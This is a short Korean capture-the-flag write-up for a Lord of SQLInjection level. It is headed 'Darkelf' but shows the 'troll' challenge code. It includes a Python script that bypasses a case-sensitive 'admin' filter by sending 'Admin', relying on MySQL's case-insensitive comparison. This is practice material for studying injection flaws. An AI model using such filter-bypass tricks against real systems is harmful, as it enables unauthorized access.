
## Darkelf Write-up

### 문제
``` php
<?php  
include "./config.php";  
login_chk();  
dbconnect();  
if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");  
if(@ereg("admin",$_GET[id])) exit("HeHe");  
$query = "select id from prob_troll where id='{$_GET[id]}'";  
echo "<hr>query : <strong>{$query}</strong><hr><br>";  
$result = @mysql_fetch_array(mysql_query($query));  
if($result['id'] == 'admin') solve("troll");  
highlight_file(__FILE__);  
?>
```

### Exploit 코드
``` python
import requests

url = 'https://los.rubiya.kr/troll_05b5eb65d94daf81c42dd44136cb0063.php?'
cookies = {'PHPSESSID' : 'My PHPSESSID'}
params = {}
params['id'] = 'Admin'

res = requests.get(url, cookies=cookies, params=params)

if "Clear" in res.text :
    print("[♪] TROLL Clear")
```
이번 문제는 id가 admin이면 문제가 풀리는데 admin이 필터링 되어 있다.  
MySQL은 대소문자를 구분하지 않는다는 특징이 있다.  
따라서 `admin`과 `Admin`을 같은 문자열로 보기 때문에 이를 이용하면 문제가 풀린다.